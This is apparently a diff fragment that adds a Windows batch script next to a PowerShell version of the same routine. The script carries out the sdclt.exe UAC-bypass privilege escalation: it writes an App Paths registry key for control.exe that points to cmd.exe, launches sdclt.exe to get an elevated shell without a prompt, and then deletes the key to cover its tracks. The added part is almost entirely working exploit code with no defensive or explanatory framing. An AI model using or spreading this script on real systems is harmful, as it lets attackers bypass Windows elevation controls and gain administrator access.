@@ -41,3 +41,22 @@ Start-Sleep 3
  
 Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" -Recurse -Force
 }
+
+----------------------------------------------------
+
+@echo off
+
+REM Set the default program to cmd.exe if not specified
+set program=C:\Windows\System32\cmd.exe
+
+REM Create Registry Structure
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /ve /t REG_SZ /d "%program%" /f
+
+REM Start sdclt.exe
+start "" "C:\Windows\System32\sdclt.exe"
+
+REM Sleep for 3 seconds
+timeout /t 3 /nobreak >nul
+
+REM Cleanup the registry
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /f
